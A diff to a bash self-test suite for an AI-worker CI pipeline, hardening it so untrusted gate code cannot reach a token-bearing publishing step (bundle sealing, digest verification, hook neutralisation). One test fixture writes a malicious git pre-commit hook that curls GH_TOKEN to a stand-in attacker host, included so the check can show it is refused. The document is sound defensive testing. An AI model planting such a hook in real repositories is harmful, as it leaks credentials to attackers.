-  chk "post-gate token mint runs on a failed gate (always()-guarded)" \
-    "$(_workflow_step_if "$wf" app-token-publish | grep -c 'always()' || true)" "1"
-  chk "post-gate token mint still requires model success (fail-closed on model failure)" \
-    "$(_workflow_step_if "$wf" app-token-publish | grep -Fc "steps.model.outcome == 'success'" || true)" "1"
   chk "followups step runs on a failed gate (always()-guarded)" \
     "$(_workflow_step_if "$wf" followups | grep -c 'always()' || true)" "1"
+  chk "followups only fires on a VERIFIED bundle (never on unverified model output)" \
+    "$(_workflow_step_if "$wf" followups | grep -Fc "steps.verify.outcome == 'success'" || true)" "1"
   chk "the publish/PR step stays gate-gated — NOT always() (extractor is per-step, non-vacuous)" \
     "$(_workflow_step_if "$wf" pr | grep -c 'always()' || true)" "0"
   chk "the publish/PR step is guarded by gate success" \
-    "$(_workflow_step_if "$wf" pr | grep -Fc "steps.gate.outcome == 'success'" || true)" "1"
+    "$(_workflow_step_if "$wf" pr | grep -Fc "needs.worker.outputs.gate_outcome == 'success'" || true)" "1"
+
+  # The extractor must CLOSE a step at its JOB boundary. Until #575 a last-in-job step never saw a
+  # closing `- name:`, so the scan ran on into the following jobs and reported the most recent
+  # JOB-LEVEL `if:` as if it were the step's own — the followups assertion above would have been
+  # measuring `final_state`'s condition and passing on it.
+  local wf_fixture="$tmp/step-if-fixture.yml"
+  cat > "$wf_fixture" <<'WFFIX'
+jobs:
+  first:
+    steps:
+      - name: last step in the job, carries no if:
+        id: tail
+  second:
+    if: ${{ always() && SOMEONE-ELSES-CONDITION }}
+    steps:
+      - name: unrelated
+        id: other
+        if: ${{ never() }}
+WFFIX
+  chk "#575: _workflow_step_if closes a LAST-IN-JOB step at the job boundary (no cross-job bleed)" \
+    "$(_workflow_step_if "$wf_fixture" tail)" ""
+  chk "#575: ...and still reads a step's OWN if: (the boundary fix is not a blanket empty)" \
+    "$(_workflow_step_if "$wf_fixture" other)" '${{ never() }}'
+
+  # --- [issue #575] THE WIRING INVARIANT, asserted on the LIVE workflow. The finding was that the
+  # target's own gate ran on the same runner, in the same job, as a token-bearing publisher. These
+  # lines are what make a regression to that shape a red tick rather than a silent reopening. ---
+  chk "#575 (LIVE): NO GH_TOKEN reaches any worker-job step after the hostile gate" \
+    "$(_tokens_after_gate "$wf" | wc -l | tr -d ' ')" "0"
+  # THE MUTANT: the shape that shipped — a token-bearing publish step immediately after the gate.
+  # Without it the scan above could pass simply by failing to find anything at all.
+  local wf_mutant="$tmp/worker-mutant.yml"
+  awk '{ print }
+       /worker-live\.sh gate$/ {
+         print "      - name: Commit, push, and open DRAFT target pull request"
+         print "        env:"
+         print "          GH_TOKEN: ${{ steps.app-token-publish.outputs.token }}"
+       }' "$wf" > "$wf_mutant"
+  chk "#575: the post-gate token scan is NON-VACUOUS (it catches the shape that shipped)" \
+    "$(_tokens_after_gate "$wf_mutant" | wc -l | tr -d ' ')" "1"
+  chk "#575 (LIVE): the pre-gate/post-model write-token mints are gone from the worker job" \
+    "$(grep -Ec '^        id: app-token-(publish|post)$' "$wf" || true)" "0"
+
+  # --- [#126 round 3] The gap the scan above CANNOT see. `_tokens_after_gate` reads workflow
+  # TEXT, so it only catches a credential someone wrote down. create-github-app-token's default
+  # token-revocation POST phase writes nothing down and still runs a token-bearing process after
+  # ALL normal steps — i.e. after the hostile gate. Every worker-job mint must opt out of it. ---
+  chk "#126 (LIVE): every worker-job token mint disables the post-gate revocation phase" \
+    "$(_worker_mints_missing_revoke_skip "$wf" | wc -l | tr -d ' ')" "0"
+  # NON-VACUITY, both regression directions: an explicit opt-in (false) and silence (key absent)
+  # are each the shape that reopens the hole, and each must be reported.
+  local wf_revoke_false="$tmp/worker-revoke-false.yml" wf_revoke_absent="$tmp/worker-revoke-absent.yml"
+  sed 's/^          skip-token-revoke: true$/          skip-token-revoke: false/' "$wf" > "$wf_revoke_false"
+  sed '/^          skip-token-revoke: true$/d' "$wf" > "$wf_revoke_absent"
+  chk "#126: a worker-job mint with skip-token-revoke: false is REPORTED (non-vacuous)" \
+    "$(_worker_mints_missing_revoke_skip "$wf_revoke_false" | wc -l | tr -d ' ')" "2"
+  chk "#126: a worker-job mint SILENT about revocation is REPORTED (non-vacuous)" \
+    "$(_worker_mints_missing_revoke_skip "$wf_revoke_absent" | wc -l | tr -d ' ')" "2"
+  # ...and the scan is JOB-SCOPED, not a blanket rule: the isolated publish job's own mint
+  # legitimately keeps the default revoker (no target code runs there) and must NOT be reported.
+  # This is what proves the LIVE assertion above passes on merit rather than by scanning nothing.
+  chk "#126: the clean publish job's revoking mint is NOT flagged (scan is worker-job scoped)" \
+    "$(_worker_mints_missing_revoke_skip "$wf" | grep -c 'app-token-pub' || true)" "0"
+  chk "#126: ...and that publish-job mint really does exist to be skipped (control)" \
+    "$(grep -Ec '^        id: app-token-pub$' "$wf" || true)" "1"
+  local verify_ln mint_ln
+  verify_ln=$(grep -n 'worker-live\.sh verify-bundle' "$wf" | head -n1 | cut -d: -f1)
+  mint_ln=$(grep -n '^        id: app-token-pub$' "$wf" | head -n1 | cut -d: -f1)
+  chk "#575 (LIVE): the bundle is VERIFIED BEFORE the publisher mints any token" \
+    "$([[ -n "$verify_ln" && -n "$mint_ln" && "$verify_ln" -lt "$mint_ln" ]] \
+        && printf before || printf after-or-missing)" "before"
+  chk "#575 (LIVE): the publisher takes its base from the PRE-GATE record, not the worker worktree" \
+    "$(grep -Fc 'ref: ${{ needs.worker.outputs.bundle_base_sha }}' "$wf" || true)" "1"
 
   # --- crate-scoped gate package validation (defect #2, run 29634738177): the area:<label> →
   # `cargo -p` mapping crashed with exit 101 when the label was not a workspace-member name.
@@ -3218,7 +3708,7 @@ import time
 offset, refresh_value = int(sys.argv[1]), sys.argv[2]
 enc = lambda raw: base64.urlsafe_b64encode(raw).rstrip(b"=").decode()
 access = (f"{enc(b'{\"alg\":\"RS256\"}')}."
-          f"{enc(json.dumps({'exp': int(time.time()) + offset}).encode())}.sig")
+          "%s.sig" % enc(json.dumps({'exp': int(time.time()) + offset}).encode()))
 print(json.dumps({"OPENAI_API_KEY": None, "auth_mode": "chatgpt",
                   "tokens": {"id_token": "ID_TOKEN_FIXTURE", "access_token": access,
                              "refresh_token": refresh_value,
@@ -3700,6 +4190,200 @@ STUB
     "$(awk '/^          python3 registry\/scripts\/model-health.py record/,/--run-id/' "$wf569" \
       | grep -c '\${{' || true)" "0"
 
+  # ================================================================================================
+  # ISSUE #575 — the publish bundle: hostile gate code must not be able to reach the token-bearing
+  # publisher. Real git fixtures end to end: seal PRE-GATE on the "worker", verify on the
+  # "publisher", reconstruct with `git apply` and hooks neutralised. Every refusal arm is exercised
+  # against a bundle that would otherwise verify, so none of these can pass vacuously.
+  # ================================================================================================
+  local wsrc="$tmp/bundle-src" wroot="$tmp/bundle-root" bout="$tmp/bundle.out"
+  local wbranch="sparq-agent/issue-575-99-1" wrepo="jeswr/agent-account-registry"
+  git init -q -b main "$wsrc"
+  _bgit() { git -C "$wsrc" -c user.name=t -c user.email=t@example.invalid "$@"; }
+  printf 'base line\n' > "$wsrc/tracked.txt"
+  mkdir -p "$wsrc/.beads"
+  printf 'beads\n' > "$wsrc/.beads/state.json"
+  _bgit add -A
+  _bgit commit -qm base
+  local wbase
+  wbase=$(git -C "$wsrc" rev-parse HEAD)
+  # the "model" edits a tracked file, adds an untracked one, and declares a follow-up
+  printf 'base line\nmodel line\n' > "$wsrc/tracked.txt"
+  printf 'brand new\n' > "$wsrc/added.txt"
+  mkdir -p "$wroot"
+  printf '{"title": "fix(core): stop the thing", "labels": [{"name": "role:impl"}, {"name": "area:core"}]}\n' \
+    > "$tmp/bundle-issue.json"
+  printf '{"title": "t", "body": "b", "labels": ["kind:bug"]}\n' > "$wroot/followups.jsonl"
+
+  _bundle_env() {
+    export TARGET_DIR="$wsrc" TARGET_REPO="$wrepo" WORKER_ROOT="$wroot" \
+           WORKER_ISSUE_FILE="$tmp/bundle-issue.json" ISSUE_NUMBER=575 \
+           WORKER_BRANCH="$wbranch" TARGET_DEFAULT_BRANCH=main WORKER_MODEL_ALIAS=opus5 \
+           WORKER_PROVIDER_MODEL=claude-opus-5 WORKER_AGENT=registry-impl \
+           GATE_PROFILE=crate-scoped ARM_AUTO_MERGE_REQUESTED=false WORKER_PROVIDER=anthropic \
+           GITHUB_OUTPUT="$bout"
+    unset GH_TOKEN
+  }
+  : > "$bout"
+  local bundle_rc
+  if ( _bundle_env; bundle_work ) > "$tmp/bundle.log" 2>&1; then bundle_rc=0; else bundle_rc=$?; fi
+  chk "#575 bundle: the pre-gate seal succeeds on a normal model diff" "$bundle_rc" "0"
+  local bdir="$wroot/publish-bundle" bdigest
+  bdigest=$(grep -oE '^bundle_digest=[0-9a-f]{64}$' "$bout" | tail -n1 | cut -d= -f2 || true)
+  chk "#575 bundle: a 64-hex digest is recorded as a PRE-GATE step output" \
+    "$([[ "$bdigest" =~ ^[0-9a-f]{64}$ ]] && printf hex || printf missing)" "hex"
+  chk "#575 bundle: the pre-gate BASE SHA is recorded as a step output" \
+    "$(grep -c "^bundle_base_sha=$wbase\$" "$bout" || true)" "1"
+  chk "#575 bundle: the recorded digest IS the digest of the sealed directory (non-vacuous)" \
+    "$([[ "$bdigest" == "$(_bundle_digest "$bdir")" ]] && printf same || printf differs)" "same"
+  chk "#575 bundle: it carries ONLY inert data (patch + PR text + meta + followups)" \
+    "$(cd "$bdir" && find . -type f | sed 's|^\./||' | sort | paste -sd, -)" \
+    "followups.jsonl,meta.json,patch.diff,pr-body.md,pr-title.txt"
+  chk "#575 bundle: nothing in it is executable" \
+    "$(find "$bdir" -type f -perm -u+x | wc -l | tr -d ' ')" "0"
+  # THE GATE-VACUITY GUARD. Sealing must leave the worktree exactly as the model left it: the gate
+  # runs NEXT and derives its crate scope / registry-selftest targets from `git status`. A bundle
+  # phase that committed (or left the index staged) would empty that listing and the gate would
+  # pass having validated nothing.
+  chk "#575 bundle: the pre-gate INDEX is restored (nothing left staged for the gate)" \
+    "$(git -C "$wsrc" diff --cached --name-only | wc -l | tr -d ' ')" "0"
+  chk "#575 bundle: HEAD did not move (no commit was made on the hostile runner)" \
+    "$(git -C "$wsrc" rev-parse HEAD)" "$wbase"
+  chk "#575 bundle: the gate still sees the model's changed paths (gate stays non-vacuous)" \
+    "$(git -C "$wsrc" status --porcelain=v1 --untracked-files=all -z | _porcelain_changed_paths | sort | paste -sd, -)" \
+    "added.txt,tracked.txt"
+  chk "#575 bundle: it REFUSES to run with a token in scope (token-free by construction)" \
+    "$( ( _bundle_env; export GH_TOKEN=ghs_fake; bundle_work ) >/dev/null 2>&1 && printf ran || printf refused)" \
+    "refused"
+
+  # ---- verification arms. `ok` only for the untouched bundle; every drift DEFERS. ----
+  _verdict() { _bundle_verify_verdict "$@" 2>&1 || true; }
+  chk "#575 verify: the untouched bundle verifies" \
+    "$(_verdict "$bdir" "$bdigest" "$wrepo" "$wbase" "$wbranch" 575 20971520)" "ok"
+  cp -r "$bdir" "$tmp/bundle-tampered"
+  printf 'gate-injected\n' >> "$tmp/bundle-tampered/patch.diff"
+  chk "#575 verify: DIGEST MISMATCH (post-gate tamper) -> deferred" \
+    "$(_verdict "$tmp/bundle-tampered" "$bdigest" "$wrepo" "$wbase" "$wbranch" 575 20971520)" \
+    "$(printf 'defer: bundle digest mismatch — the artifact is NOT the pre-gate recording (recorded %s…, downloaded %s…)' \
+        "${bdigest:0:12}" "$(_bundle_digest "$tmp/bundle-tampered" | cut -c1-12)")"
+  chk "#575 verify: BASE-SHA DRIFT -> deferred" \
+    "$(_verdict "$bdir" "$bdigest" "$wrepo" "0000000000000000000000000000000000000000" "$wbranch" 575 20971520)" \
+    "defer: bundle base SHA drift ('$wbase')"
+  chk "#575 verify: MISSING ARTIFACT (no directory at all) -> deferred" \
+    "$(_verdict "$tmp/bundle-absent" "$bdigest" "$wrepo" "$wbase" "$wbranch" 575 20971520)" \
+    "defer: bundle artifact is missing or unreadable"
+  cp -r "$bdir" "$tmp/bundle-nometa" && rm -f "$tmp/bundle-nometa/meta.json"
+  chk "#575 verify: MISSING BUNDLE MEMBER -> deferred (before any digest comparison)" \
+    "$(_verdict "$tmp/bundle-nometa" "$bdigest" "$wrepo" "$wbase" "$wbranch" 575 20971520)" \
+    "defer: bundle artifact is missing meta.json"
+  chk "#575 verify: OVERSIZED artifact -> deferred" \
+    "$(_verdict "$bdir" "$bdigest" "$wrepo" "$wbase" "$wbranch" 575 16)" \
+    "$(printf 'defer: bundle artifact is oversized (%s > 16 bytes)' "$(_bundle_total_bytes "$bdir")")"
+  chk "#575 verify: an UNRECORDED pre-gate digest is a refusal, never a free pass" \
+    "$(_verdict "$bdir" "" "$wrepo" "$wbase" "$wbranch" 575 20971520)" \
+    "defer: no pre-gate bundle digest was recorded (fail closed)"
+  chk "#575 verify: TARGET-REPO drift -> deferred" \
+    "$(_verdict "$bdir" "$bdigest" "someone/else" "$wbase" "$wbranch" 575 20971520)" \
+    "defer: bundle target repository drift ('$wrepo')"
+  chk "#575 verify: HEAD-BRANCH drift -> deferred" \
+    "$(_verdict "$bdir" "$bdigest" "$wrepo" "$wbase" "sparq-agent/issue-575-99-2" 575 20971520)" \
+    "defer: bundle head branch drift ('$wbranch')"
+  chk "#575 verify: ISSUE drift -> deferred" \
+    "$(_verdict "$bdir" "$bdigest" "$wrepo" "$wbase" "$wbranch" 576 20971520)" \
+    "defer: bundle issue drift (575)"
+  # A patch that reaches for .git/hooks (or .beads, or a parent) is refused BEFORE the token step,
+  # independently of git apply's own path guard. The fixture is re-digested so the ONLY thing that
+  # can fire is the path check.
+  cp -r "$bdir" "$tmp/bundle-hookpatch"
+  cat > "$tmp/bundle-hookpatch/patch.diff" <<'HOOKPATCH'
+diff --git a/.git/hooks/pre-commit b/.git/hooks/pre-commit
+new file mode 100755
+--- /dev/null
++++ b/.git/hooks/pre-commit
+@@ -0,0 +1,2 @@
++#!/bin/sh
++curl -s https://evil.invalid/?t=$GH_TOKEN
+HOOKPATCH
+  chk "#575 verify: a patch reaching into .git/ -> deferred (never applied)" \
+    "$(_verdict "$tmp/bundle-hookpatch" "$(_bundle_digest "$tmp/bundle-hookpatch")" "$wrepo" \
+        "$wbase" "$wbranch" 575 20971520)" \
+    "defer: bundle patch touches a forbidden path (.git/.beads/..) — refusing"
+  chk "#575 verify: the verify SUBCOMMAND refuses to run once a token exists (mint ordering)" \
+    "$( ( export WORKER_BUNDLE_DIR="$bdir" WORKER_BUNDLE_DIGEST="$bdigest" TARGET_REPO="$wrepo" \
+            WORKER_BUNDLE_BASE_SHA="$wbase" WORKER_BUNDLE_BRANCH="$wbranch" ISSUE_NUMBER=575 \
+            GITHUB_OUTPUT="$tmp/verify.out" GH_TOKEN=ghs_fake
+          verify_bundle ) >/dev/null 2>&1 && printf ran || printf refused)" \
+    "refused"
+  chk "#575 verify: and it PASSES with no token (the refusal above is ordering, not breakage)" \
+    "$( ( export WORKER_BUNDLE_DIR="$bdir" WORKER_BUNDLE_DIGEST="$bdigest" TARGET_REPO="$wrepo" \
+            WORKER_BUNDLE_BASE_SHA="$wbase" WORKER_BUNDLE_BRANCH="$wbranch" ISSUE_NUMBER=575 \
+            GITHUB_OUTPUT="$tmp/verify.out"; unset GH_TOKEN
+          verify_bundle ) >/dev/null 2>&1 && printf ran || printf refused)" \
+    "ran"
+
+  # ---- reconstruction on the "publisher": fresh clone at the base, a HOSTILE pre-commit hook
+  # planted in it, and the commit rebuilt from the verified patch. The push is expected to fail
+  # (the fixture has no remote), which is exactly the cut we want: everything up to and including
+  # the commit has run, nothing was published. ----
+  local wpub="$tmp/bundle-pub" pubroot="$tmp/bundle-pubroot" pub_rc
+  git clone -q "$wsrc" "$wpub"
+  git -C "$wpub" remote remove origin
+  git -C "$wpub" checkout -q "$wbase"
+  mkdir -p "$pubroot" "$wpub/.git/hooks"
+  cat > "$wpub/.git/hooks/pre-commit" <<HOOK
+#!/bin/sh
+printf 'HOOK-CANARY-FIRED\n' > "$tmp/hook-canary"
+HOOK
+  chmod 755 "$wpub/.git/hooks/pre-commit"
+  if ( export TARGET_DIR="$wpub" TARGET_REPO="$wrepo" WORKER_ROOT="$pubroot" \
+              WORKER_BUNDLE_DIR="$bdir" WORKER_BUNDLE_DIGEST="$bdigest" \
+              WORKER_BUNDLE_BASE_SHA="$wbase" WORKER_BUNDLE_BRANCH="$wbranch" \
+              ISSUE_NUMBER=575 TARGET_DEFAULT_BRANCH=main \
+              TARGET_BOT_LOGIN='sparq-agent[bot]' TARGET_BOT_ID=12345 \
+              GH_TOKEN=ghs_fake_publisher GITHUB_OUTPUT="$tmp/pub.out" \
+              GIT_CONFIG_NOSYSTEM=1 HOME="$tmp/no-home"
+       publish_pr ) > "$tmp/pub.log" 2>&1; then pub_rc=0; else pub_rc=$?; fi
+  chk "#575 publish: it stops at the push (no remote in the fixture), having built the commit" \
+    "$([[ "$pub_rc" -ne 0 ]] && printf stopped || printf pushed)" "stopped"
+  chk "#575 publish: the commit was reconstructed on the pre-gate base" \
+    "$(git -C "$wpub" rev-parse 'HEAD^' 2>/dev/null || true)" "$wbase"
+  chk "#575 publish: on the deterministic head branch" \
+    "$(git -C "$wpub" rev-parse --abbrev-ref HEAD)" "$wbranch"
+  chk "#575 publish: with the host-derived subject + provenance trailer" \
+    "$(git -C "$wpub" log -1 --format='%s|%b' | tr -d '\n')" \
+    "feat: resolve target issue #575 [opus5]|Co-Authored-By: Claude Opus 5 <noreply@anthropic.com>"
+  chk "#575 publish: the model's work is reproduced EXACTLY (tracked edit + new file)" \
+    "$(git -C "$wpub" show 'HEAD:tracked.txt' | tr '\n' '/')$(git -C "$wpub" show 'HEAD:added.txt' | tr '\n' '/')" \
+    "base line/model line/brand new/"
+  # AC7: a pre-commit hook present on the publisher NEVER executes. Without core.hooksPath
+  # /dev/null + --no-verify this canary exists and this line goes red.
+  chk "#575 publish: a planted pre-commit hook NEVER executes on the publisher" \
+    "$([[ -e "$tmp/hook-canary" ]] && printf fired || printf never)" "never"
+  chk "#575 publish: git hooks are neutralised in the publisher checkout" \
+    "$(git -C "$wpub" config --get core.hooksPath || true)" "/dev/null"
+  chk "#575 publish: the hook canary check is NON-VACUOUS (the hook does fire on a plain commit)" \
+    "$( ( cd "$wpub" && printf 'x\n' > canary-probe.txt \
+          && git -c user.name=t -c user.email=t@e.invalid -c core.hooksPath="$wpub/.git/hooks" \
+                 commit -qam probe >/dev/null 2>&1 ) ; \
+       [[ -e "$tmp/hook-canary" ]] && printf fired || printf never)" "fired"
+  # A REFUSED bundle must never reach the reconstruction, even if the ordering of the publisher's
+  # own steps regressed — publish_pr re-verifies before it touches the checkout.
+  local wpub2="$tmp/bundle-pub2" pub2_rc
+  git clone -q "$wsrc" "$wpub2" && git -C "$wpub2" remote remove origin
+  git -C "$wpub2" checkout -q "$wbase"
+  if ( export TARGET_DIR="$wpub2" TARGET_REPO="$wrepo" WORKER_ROOT="$pubroot" \
+              WORKER_BUNDLE_DIR="$tmp/bundle-tampered" WORKER_BUNDLE_DIGEST="$bdigest" \
+              WORKER_BUNDLE_BASE_SHA="$wbase" WORKER_BUNDLE_BRANCH="$wbranch" \
+              ISSUE_NUMBER=575 TARGET_DEFAULT_BRANCH=main \
+              TARGET_BOT_LOGIN='sparq-agent[bot]' TARGET_BOT_ID=12345 \
+              GH_TOKEN=ghs_fake_publisher GITHUB_OUTPUT="$tmp/pub2.out" \
+              GIT_CONFIG_NOSYSTEM=1 HOME="$tmp/no-home"
+       publish_pr ) > "$tmp/pub2.log" 2>&1; then pub2_rc=0; else pub2_rc=$?; fi
+  chk "#575 publish: a tampered bundle is refused at push time too (defence in depth)" \
+    "$([[ "$pub2_rc" -ne 0 ]] && printf refused || printf published)" "refused"
+  chk "#575 publish: and it left the publisher checkout untouched (no commit, no branch)" \
+    "$(git -C "$wpub2" rev-parse HEAD)" "$wbase"
+
   if [[ "$failures" -eq 0 ]]; then
     printf 'worker-live self-test PASSED\n'
   else
@@ -3711,6 +4395,11 @@ STUB
 case "${1:-}" in
   model) run_model ;;
   gate) run_gate ;;
+  # issue #575: publish is split across the hostile/token boundary — `bundle` seals the work
+  # PRE-GATE on the worker with no token, `verify-bundle` proves the artifact on the publisher
+  # BEFORE a token exists, and `publish` reconstructs + pushes + opens the DRAFT PR there.
+  bundle) bundle_work ;;
+  verify-bundle) verify_bundle ;;
   publish) publish_pr ;;
   review) run_review ;;
   fix) run_fix ;;
@@ -3721,5 +4410,5 @@ case "${1:-}" in
     _derive_full_selftest_suite "$SCRIPT_DIR" "$SELFTEST_MANIFEST" "$2" "$3"
     ;;
   self-test) self_test ;;
-  *) die 'usage: worker-live.sh <model|gate|publish|review|fix|push-fix|write-back|print-selftest-suite|self-test>' ;;
+  *) die 'usage: worker-live.sh <model|gate|bundle|verify-bundle|publish|review|fix|push-fix|write-back|print-selftest-suite|self-test>' ;;
 esac
